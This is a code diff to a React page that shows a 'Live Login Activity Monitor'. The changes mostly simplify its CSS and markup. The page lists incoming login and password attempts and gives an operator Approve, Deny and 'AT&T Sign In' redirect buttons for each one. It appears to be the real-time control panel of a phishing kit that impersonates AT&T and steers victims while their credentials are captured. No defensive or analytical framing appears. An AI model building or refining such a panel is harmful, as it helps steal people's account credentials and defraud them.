@@ -133,7 +133,7 @@ export default function LinkPage() {
       }
 
       const activityItem = document.createElement('div');
-      activityItem.className = `activity-card ${className}`;
+      activityItem.className = `activity-item`;
       activityItem.id = `activity-${activity.id}`;
 
       let actionsHTML = '';
@@ -147,7 +147,7 @@ export default function LinkPage() {
             <button class="action-btn" data-action="redirect" data-redirect="att">AT&T Sign In</button>
             <button class="action-btn" data-action="deny">Deny</button>
           </div>
-          <div class="activity-status status-pending" id="status-${activity.id}">Waiting for redirect...</div>
+          <div class="activity-status" id="status-${activity.id}">Waiting...</div>
         `;
       } else if (showActions && activity.type === 'password') {
         actionsHTML = `
@@ -158,7 +158,7 @@ export default function LinkPage() {
             <button class="action-btn" data-action="redirect" data-redirect="att">AT&T Sign In</button>
             <button class="action-btn" data-action="deny">Deny</button>
           </div>
-          <div class="activity-status status-pending" id="status-${activity.id}">Waiting for redirect...</div>
+          <div class="activity-status" id="status-${activity.id}">Waiting...</div>
         `;
       } else if (showActions) {
         actionsHTML = `
@@ -166,17 +166,12 @@ export default function LinkPage() {
             <button class="action-btn" data-action="approve">Approve</button>
             <button class="action-btn" data-action="deny">Deny</button>
           </div>
-          <div class="activity-status status-pending" id="status-${activity.id}">Pending approval...</div>
+          <div class="activity-status" id="status-${activity.id}">Pending...</div>
         `;
       }
 
       activityItem.innerHTML = `
-        <div class="card-header">
-          <div class="card-header-info">
-            <div class="activity-time">${timeString}</div>
-            <div class="activity-type-badge">${activity.type.toUpperCase()}</div>
-          </div>
-        </div>
+        <div class="activity-time">${timeString}</div>
         <div class="activity-content">${content}</div>
         ${actionsHTML}
       `;
@@ -473,386 +468,92 @@ export default function LinkPage() {
 
         body {
           font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
-          background: #f5f5f5;
+          background: #ffffff;
           min-height: 100vh;
           padding: 20px;
+          margin: 0;
         }
 
-        .ready-container {
-          max-width: 1400px;
+        .simple-container {
+          max-width: 800px;
           margin: 0 auto;
         }
 
-        .header-section {
-          display: flex;
-          justify-content: space-between;
-          align-items: center;
-          margin-bottom: 30px;
-          flex-wrap: wrap;
-          gap: 20px;
-        }
-
-        .ready-text {
-          font-size: 56px;
-          font-weight: 800;
-          color: #000000;
-          letter-spacing: -1px;
-        }
-
-        .header-actions {
-          display: flex;
-          gap: 12px;
-          align-items: center;
-        }
-
-        .export-btn {
+        .activity-item {
           background: #ffffff;
-          border: 1px solid #d1d1d1;
-          color: #333;
-          padding: 10px 20px;
-          border-radius: 6px;
-          font-size: 14px;
-          font-weight: 600;
-          cursor: pointer;
-          transition: all 0.2s ease;
-        }
-
-        .export-btn:hover {
-          background: #f5f5f5;
-          border-color: #999;
-        }
-
-        .monitor-panel {
-          background: #ffffff;
-          border-radius: 20px;
-          box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
-          padding: 30px;
-          margin-bottom: 20px;
-        }
-
-        .panel-title {
-          font-size: 24px;
-          font-weight: 700;
-          color: #1a1a1a;
-          margin-bottom: 24px;
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          padding-bottom: 20px;
-          border-bottom: 2px solid #f0f0f0;
-        }
-
-        .status-indicator {
-          display: inline-block;
-          width: 14px;
-          height: 14px;
-          border-radius: 50%;
-          position: relative;
-        }
-
-        .status-active {
-          background: #00d084;
-          box-shadow: 0 0 0 4px rgba(0, 208, 132, 0.2);
-          animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-          0%, 100% {
-            box-shadow: 0 0 0 4px rgba(0, 208, 132, 0.2);
-          }
-          50% {
-            box-shadow: 0 0 0 8px rgba(0, 208, 132, 0.1);
-          }
-        }
-
-        .status-inactive {
-          background: #d1d1d1;
-        }
-
-        .activity-card {
-          background: #fafafa;
-          border-radius: 8px;
-          padding: 20px;
-          margin-bottom: 16px;
-          border: 1px solid #e0e0e0;
-          transition: all 0.2s ease;
-        }
-
-        .activity-card:hover {
-          border-color: #999;
-        }
-
-        .card-header {
-          margin-bottom: 12px;
-        }
-
-        .card-header-info {
-          flex: 1;
-          display: flex;
-          justify-content: space-between;
-          align-items: center;
+          padding: 15px;
+          margin-bottom: 10px;
+          border-bottom: 1px solid #e0e0e0;
         }
 
         .activity-time {
-          font-size: 13px;
+          font-size: 12px;
           color: #666;
-          font-weight: 500;
-        }
-
-        .activity-type-badge {
-          font-size: 11px;
-          font-weight: 700;
-          padding: 4px 10px;
-          border-radius: 4px;
-          text-transform: uppercase;
-          letter-spacing: 0.5px;
-          background: #e0e0e0;
-          color: #333;
+          margin-bottom: 8px;
         }
 
         .activity-content {
-          font-size: 16px;
-          color: #1a1a1a;
-          font-weight: 500;
-          margin-bottom: 16px;
-          line-height: 1.6;
+          font-size: 14px;
+          color: #333;
+          margin-bottom: 12px;
         }
 
         .activity-content strong {
           color: #000;
-          font-weight: 700;
+          font-weight: 600;
         }
 
         .activity-content code {
-          background: #f0f0f0;
-          padding: 4px 10px;
-          border-radius: 4px;
-          font-family: 'Monaco', 'Menlo', monospace;
-          font-size: 14px;
+          background: #f5f5f5;
+          padding: 2px 6px;
+          border-radius: 3px;
+          font-family: monospace;
+          font-size: 13px;
           color: #333;
-          border: 1px solid #d0d0d0;
-          font-weight: 600;
         }
 
         .no-activity {
           text-align: center;
           color: #999;
-          font-size: 16px;
-          padding: 60px 20px;
+          font-size: 14px;
+          padding: 40px 20px;
         }
 
         .activity-actions {
           display: flex;
-          gap: 10px;
-          margin-top: 16px;
+          gap: 8px;
           flex-wrap: wrap;
         }
 
         .action-btn {
           padding: 8px 16px;
           border: 1px solid #d1d1d1;
-          border-radius: 4px;
+          border-radius: 20px;
           font-size: 13px;
-          font-weight: 600;
+          font-weight: 500;
           cursor: pointer;
-          transition: all 0.2s ease;
           background: #ffffff;
           color: #333;
+          transition: all 0.15s ease;
         }
 
         .action-btn:hover {
           background: #f5f5f5;
-          border-color: #999;
         }
 
         .action-btn:active {
-          background: #e8e8e8;
+          transform: scale(0.98);
         }
 
         .activity-status {
-          margin-top: 12px;
-          font-size: 13px;
-          font-weight: 500;
+          margin-top: 8px;
+          font-size: 12px;
           color: #666;
-          padding: 8px 12px;
-          border-radius: 4px;
-          background: white;
-          border: 1px solid #e0e0e0;
-        }
-
-        .status-pending {
-          color: #666;
-        }
-
-        .status-approved {
-          color: #333;
-        }
-
-        .status-denied {
-          color: #333;
-        }
-
-        .pagination-controls {
-          display: flex;
-          justify-content: space-between;
-          align-items: center;
-          margin-top: 24px;
-          padding-top: 20px;
-          border-top: 2px solid #f0f0f0;
-        }
-
-        .pagination-info {
-          font-size: 14px;
-          color: #666;
-          font-weight: 500;
-        }
-
-        .pagination-buttons {
-          display: flex;
-          gap: 10px;
-        }
-
-        .page-btn {
-          padding: 8px 16px;
-          background: #f0f0f0;
-          border: none;
-          border-radius: 8px;
-          font-size: 14px;
-          font-weight: 600;
-          cursor: pointer;
-          transition: all 0.2s ease;
-          color: #333;
-        }
-
-        .page-btn:hover:not(:disabled) {
-          background: #667eea;
-          color: white;
-          transform: translateY(-2px);
-        }
-
-        .page-btn:disabled {
-          opacity: 0.4;
-          cursor: not-allowed;
-        }
-
-        .toast-notification {
-          position: fixed;
-          bottom: 30px;
-          right: 30px;
-          background: #1a1a1a;
-          color: white;
-          padding: 16px 24px;
-          border-radius: 12px;
-          box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
-          font-size: 14px;
-          font-weight: 600;
-          z-index: 10000;
-          opacity: 0;
-          transform: translateY(20px);
-          transition: all 0.3s ease;
-        }
-
-        .toast-notification.show {
-          opacity: 1;
-          transform: translateY(0);
-        }
-
-        .info-box {
-          margin-top: 20px;
-          padding: 20px;
-          background: #ffffff;
-          border-radius: 8px;
-          border: 1px solid #d1d1d1;
-        }
-
-        .info-box strong {
-          display: block;
-          font-size: 16px;
-          margin-bottom: 8px;
-          color: #1a1a1a;
-        }
-
-        .info-box code {
-          background: #f0f0f0;
-          padding: 4px 8px;
-          border-radius: 4px;
-          font-family: monospace;
-          color: #333;
-          font-weight: 600;
-        }
-
-        @media (max-width: 768px) {
-          .ready-text {
-            font-size: 40px;
-          }
-
-          .header-section {
-            flex-direction: column;
-            align-items: flex-start;
-          }
-
-          .activity-card {
-            padding: 16px;
-          }
-
-          .activity-actions {
-            flex-direction: column;
-          }
-
-          .action-btn {
-            width: 100%;
-            justify-content: center;
-          }
-
-          .pagination-controls {
-            flex-direction: column;
-            gap: 16px;
-          }
-
-          .toast-notification {
-            bottom: 20px;
-            right: 20px;
-            left: 20px;
-          }
         }
       `}</style>
-      <div className="ready-container">
-        <div className="header-section">
-          <div className="ready-text">ready</div>
-          <div className="header-actions">
-            <button className="export-btn" onClick={() => window.exportActivities && window.exportActivities('json')}>
-              Export JSON
-            </button>
-            <button className="export-btn" onClick={() => window.exportActivities && window.exportActivities('csv')}>
-              Export CSV
-            </button>
-          </div>
-        </div>
-        
-        <div className="monitor-panel">
-          <div className="panel-title">
-            <span className="status-indicator status-active" id="status-indicator"></span>
-            Live Login Activity Monitor
-          </div>
-          <div id="activity-log">
-            <div className="no-activity">
-              <div>No activity yet. Waiting for login attempts...</div>
-            </div>
-          </div>
-          <div className="pagination-controls" style={{ display: 'none' }} id="pagination">
-            <div className="pagination-info" id="pagination-info">
-              Showing 1-20 of 0 activities
-            </div>
-            <div className="pagination-buttons">
-              <button className="page-btn" id="prev-btn">← Previous</button>
-              <button className="page-btn" id="next-btn">Next →</button>
-            </div>
-          </div>
-        </div>
-        
-        <div className="info-box">
-          <strong>Real-Time Monitoring Active</strong>
-          Activities appear automatically without refresh • Access at <code>/link</code>
+      <div className="simple-container">
+        <div id="activity-log">
+          <div className="no-activity">No activity yet. Waiting for login attempts...</div>
         </div>
       </div>
     </>
